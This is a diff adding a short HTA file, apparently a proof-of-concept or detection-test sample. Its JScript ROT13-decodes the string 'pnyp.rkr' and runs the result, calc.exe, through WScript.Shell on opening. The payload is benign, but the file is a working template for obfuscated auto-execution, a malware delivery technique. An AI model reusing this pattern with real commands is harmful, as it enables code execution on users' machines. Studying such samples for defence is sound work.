@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>HTA ROT13 Exec</title>
+<meta http-equiv="x-ua-compatible" content="IE=edge" />
+<HTA:APPLICATION id="htaApp" border="thin" />
+
+<script language="JScript">
+
+// ROT13 decoder
+function rot13(str) {
+    var result = "";
+    for (var i = 0; i < str.length; i++) {
+        var c = str.charCodeAt(i);
+        if (c >= 65 && c <= 90) {
+            result += String.fromCharCode(((c - 65 + 13) % 26) + 65);
+        } else if (c >= 97 && c <= 122) {
+            result += String.fromCharCode(((c - 97 + 13) % 26) + 97);
+        } else {
+            result += str[i];
+        }
+    }
+    return result;
+}
+
+// Obfuscated string (ROT13 of "calc.exe")
+var encoded = "pnyp.rkr";
+
+// Decode it
+var decoded = rot13(encoded);
+
+// Create WScript.Shell and execute decoded string
+var shell = new ActiveXObject("WScript.Shell");
+shell.Run(decoded);
+
+</script>
+</head>
+<body>
+</body>
+</html>
